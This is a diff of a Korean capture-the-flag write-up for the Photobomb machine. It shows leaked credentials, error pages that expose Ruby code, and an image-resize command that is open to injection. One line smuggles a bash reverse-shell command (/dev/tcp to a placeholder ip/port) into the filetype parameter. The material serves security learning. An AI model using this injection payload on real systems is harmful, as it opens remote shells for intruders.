@@ -15,15 +15,20 @@
 # 취약점 탐색
 
 - 주어진 IP로 접속하면 다음과 같은 홈페이지를 확인할 수 있다.
-  
+
+<img src="https://drive.google.com/uc?export=view&id=12F0Jf3F-qF1trrguU586m2tlxvrLWWYd">
 
 - 이미지 다운로드 페이지로 접속하려면 다음과 같이 credential이 필요하다.
    
+<img src="https://drive.google.com/uc?export=view&id=1BdjSeLFNOL3ee9zMeiHNGD7HT-E0gMv5">
    
 - credential은 다음과 같이 photobomb.js 에서 확인할 수 있다.
-   
+
+<img src="https://drive.google.com/uc?export=view&id=1H9JgKkTr7fiep7x95sKV-3hjrYKQlMie">
   
 - 이미지 다운로드 페이지에서는 다운로드 받을 이미지와 해상도를 선택하여 다운받을 수 있다.
+
+<img src="https://drive.google.com/uc?export=view&id=1Mqh-IM9qvPUhdboWndpw9dBlZv1xbKpb">
 
 - 이미지 다운로드 버튼을 클릭하면 아래의 파라미터들이 POST 메소드를 통해 전달된다.
   
@@ -34,6 +39,8 @@
   
   
 - 여기서 각각의 파라미터들을 배열 형태로 넘기거나 null값을 넘기면 에러가 발생하는데 에러 페이지에서는 이미지 처리 관련 ruby코드의 일부분을 출력한다. (추가적으로 sinatra라는 패키지를 사용하는 것을 알 수 있다.
+
+<img src="https://drive.google.com/uc?export=view&id=1S8Jrrh3PzRLM7IAIgEx8Wj8GUXd6WJR6">
 
 - 에러를 지속적으로 발생시켜서 출력되는 코드의 일부분들을 조합하여 정리하면 이미지 resize 및 다운로드와 관련된 코드들을 어떻게 동작하는지 확인이 가능하다.
 
@@ -119,7 +126,9 @@ command = 'convert source_images/' + photo + ' -resize ' + dimensions + ' resize
 photo=wolfgang-hasselmann-RLEgmd1O7gs-unsplash.jpg&filetype=%26%26bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fip%2Fport%200%3E%261%27&dimensions=30x20
 ~~~
 
-- Invalid Filetype. 이라는 에러가 발생한다.
+- Invalid Filetype. 이라는 에러를 출력한다.
+
+<img src="https://drive.google.com/uc?export=view&id=1WkQJNK1qGjfxyiBAUZ-rQa4Vl9DwtgKi">
 
 - 이 에러는 다음과 같은 filetype을 체크하는 정규표현식 부분을 통과하지 못해서 발생하는데
 
